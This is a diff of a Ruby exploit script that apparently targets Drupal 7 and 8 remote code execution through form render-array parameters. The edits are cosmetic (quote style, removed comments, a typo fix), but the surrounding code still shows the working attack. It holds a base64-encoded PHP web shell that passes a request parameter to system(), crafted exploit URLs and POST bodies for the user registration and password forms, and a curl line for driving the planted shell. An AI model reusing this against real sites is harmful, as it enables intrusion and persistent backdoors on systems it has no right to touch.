@@ -8,11 +8,11 @@
 #
 
 
-require 'base64'
-require 'json'
-require 'net/http'
-require 'openssl'
-require 'readline'
+require "base64"
+require "json"
+require "net/http"
+require "openssl"
+require "readline"
 
 
 # Settings - Proxy information (nil to disable)
@@ -27,7 +27,6 @@ writeshell = true
 
 
 # Settings - Payload (we could just be happy without this, but we can do better!)
-#bashcmd = "<?php if( isset( $_REQUEST[c] ) ) { eval( $_GET[c]) ); } ?>'
 bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
 bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d"
 
@@ -56,7 +55,7 @@ def gen_evil_url(evil, feedback=true)
 
   ## Check the version to match the payload
   # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
-  if $drupalverion.start_with?('8')
+  if $drupalverion.start_with?("8")
     # Method #1 - Drupal 8, mail, #post_render - response is 200
     url = $target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
     payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + evil
@@ -64,7 +63,7 @@ def gen_evil_url(evil, feedback=true)
     # Method #2 - Drupal 8,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
     #url = $target + "user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
     #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=" + evil
-  elsif $drupalverion.start_with?('7')
+  elsif $drupalverion.start_with?("7")
     # Method #3 - Drupal 7, name, #post_render - response is 200
     url = $target + "?q=user/password&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
     payload = "form_id=user_pass&_triggering_element_name=name"
@@ -80,7 +79,6 @@ def gen_evil_url(evil, feedback=true)
     form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).to_s.strip
     puts "[!] WARNING: Didn't detect form_build_id" if form_build_id.empty?
 
-    #url = $target + "file/ajax/name/%23value/" + form_build_id
     url = $target + "?q=file/ajax/name/%23value/" + form_build_id
     payload = "form_build_id=" + form_build_id
   end
@@ -113,11 +111,11 @@ $target = ARGV[0]
 
 
 # Check input for protocol
-if not $target.start_with?('http')
+if not $target.start_with?("http")
   $target = "http://#{$target}"
 end
 # Check input for the end
-if not $target.end_with?('/')
+if not $target.end_with?("/")
   $target += "/"
 end
 
@@ -192,7 +190,7 @@ end
 
 # Feedback
 if $drupalverion
-  status = $drupalverion.end_with?('x')? "?" : "!"
+  status = $drupalverion.end_with?("x")? "?" : "!"
   puts "[+] Drupal#{status}: #{$drupalverion}"
 else
   puts "[!] Didn't detect Drupal version"
@@ -276,7 +274,7 @@ if webshellpath
   # Feedback
   puts "[*] Fake shell:   curl '#{$target}#{webshell}' -d 'c=whoami'"
 elsif writeshell
-  puts "[!] FAILED: Coudn't find writeable web path"
+  puts "[!] FAILED: Couldn't find writeable web path"
   puts "[*] Dropping back direct commands (expect an ugly shell!)"
 end
 
